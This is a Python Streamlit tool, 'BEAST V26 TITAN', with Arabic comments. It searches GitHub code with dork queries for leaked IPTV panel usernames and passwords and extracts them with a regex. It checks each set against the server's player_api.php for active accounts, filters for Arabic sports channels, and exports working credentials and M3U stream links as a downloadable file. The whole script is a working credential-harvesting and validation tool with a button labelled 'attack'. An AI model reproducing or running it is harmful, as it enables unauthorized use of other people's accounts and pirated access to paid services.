import streamlit as st
import requests
import re
from datetime import datetime
import concurrent.futures
import time

# =================================================
# 1. إعدادات الواجهة (نظام الكروت النظيف)
# =================================================
st.set_page_config(page_title="BEAST V26 TITAN", layout="wide", page_icon="⚡")

st.markdown("""
<style>
    .stApp { background-color: #0e1117; color: #ffffff; }
    .stMetric { background: #1a1c24; padding: 10px; border-radius: 10px; border-bottom: 3px solid #00ff41; }
    .status-msg { padding: 10px; border-radius: 5px; margin: 10px 0; }
</style>
""", unsafe_allow_html=True)

if 'found' not in st.session_state: st.session_state.found = []
if 'scanning' not in st.session_state: st.session_state.scanning = False
if 'count' not in st.session_state: st.session_state.count = 0

# =================================================
# 2. محرك الصيد والتحقق (بدون تعقيد HTML)
# =================================================
def check_host(host, user, pw, target):
    try:
        api = f"{host}/player_api.php?username={user}&password={pw}"
        r = requests.get(api, timeout=5).json()
        
        if r.get("user_info", {}).get("status") == "Active":
            info = r["user_info"]
            exp = datetime.fromtimestamp(int(info['exp_date'])).strftime('%Y-%m-%d') if info.get('exp_date') else "Unlimited"
            
            # فحص القنوات
            cat_api = f"{host}/player_api.php?username={user}&password={pw}&action=get_live_categories"
            cats = requests.get(cat_api, timeout=3).text.upper()
            
            # فلترة ذكية
            is_ar = any(k in cats for k in ["ARABIC", "NILESAT", "EGYPT", "BEIN", "SSC"])
            
            if target and target.upper() not in cats:
                return None # لو طالب قناة ومش موجودة ارمي السيرفر
                
            return {
                "host": host, "user": user, "pass": pw, "exp": exp,
                "is_ar": is_ar, "m3u": f"{host}/get.php?username={user}&password={pw}&type=m3u_plus&output=ts"
            }
    except: return None

# =================================================
# 3. التحكم الجانبي
# =================================================
with st.sidebar:
    st.title("🌪️ BEAST V26")
    token = st.text_input("GitHub Token:", type="password")
    
    st.divider()
    target_ch = st.text_input("قناة مستهدفة (اختياري):", placeholder="مثال: SSC")
    search_pages = st.number_input("عدد صفحات البحث:", 1, 100, 20)
    
    col1, col2 = st.columns(2)
    with col1:
        if st.button("🚀 هجوم"): st.session_state.scanning = True
    with col2:
        if st.button("🛑 وقف"): st.session_state.scanning = False

    st.metric("🔍 فحص", st.session_state.count)
    st.metric("💎 صيد", len(st.session_state.found))

    # --- خيار تحميل ملف التكست المطلب ---
    if st.session_state.found:
        st.divider()
        txt = "--- BEAST V26 RESULTS ---\n\n"
        for i, item in enumerate(st.session_state.found):
            txt += f"[{i+1}] {item['host']}\nUSER: {item['user']} | PASS: {item['pass']}\nEXP: {item['exp']}\nM3U: {item['m3u']}\n\n"
        
        st.download_button("📥 تحميل كل النتائج (TXT)", txt, file_name="iptv_beast_hunt.txt")

# =================================================
# 4. منطقة العرض (نظام الحاويات الآمن)
# =================================================
st.header("📡 Titan Radar V26")

def show_data():
    for item in st.session_state.found:
        with st.container():
            c1, c2 = st.columns([3, 1])
            with c1:
                st.subheader(f"🌐 {item['host']}")
            with c2:
                if item['is_ar']: st.error("ARABIC ✅")
            
            st.code(f"USER: {item['user']}  |  PASS: {item['pass']}  |  EXP: {item['exp']}")
            st.info(item['m3u'])
            st.divider()

if st.session_state.scanning:
    if not token:
        st.error("⚠️ لازم تحط التوكن!")
    else:
        headers = {'Authorization': f'token {token}'}
        dorks = [
            '"player_api.php" username password SSC',
            '"get.php?username=" password BEIN',
            'filename:iptv.txt ARABIC'
        ]

        for dork in dorks:
            if not st.session_state.scanning: break
            for page in range(1, search_pages + 1):
                if not st.session_state.scanning: break
                try:
                    res = requests.get(f"https://api.github.com/search/code?q={dork}&page={page}&per_page=100", headers=headers).json()
                    
                    if 'items' in res:
                        for entry in res['items']:
                            raw_url = entry['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
                            content = requests.get(raw_url, timeout=3).text
                            matches = re.findall(r"(https?://[\w\.-]+(?::\d+)?)/[a-zA-Z\._-]+\?username=([\w\.-]+)&password=([\w\.-]+)", content)
                            
                            with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
                                results = list(executor.map(lambda p: check_host(*p, target_ch), matches))
                                for r in results:
                                    st.session_state.count += 1
                                    if r and r not in st.session_state.found:
                                        st.session_state.found.insert(0, r)
                                        # مسح العرض القديم وتحديثه
                                        st.rerun()
                    elif 'message' in res:
                        st.warning(f"🕒 GitHub Limit: سأنتظر 30 ثانية للعودة بقوة...")
                        time.sleep(30)
                        break
                except: continue
        st.session_state.scanning = False
else:
    show_data()
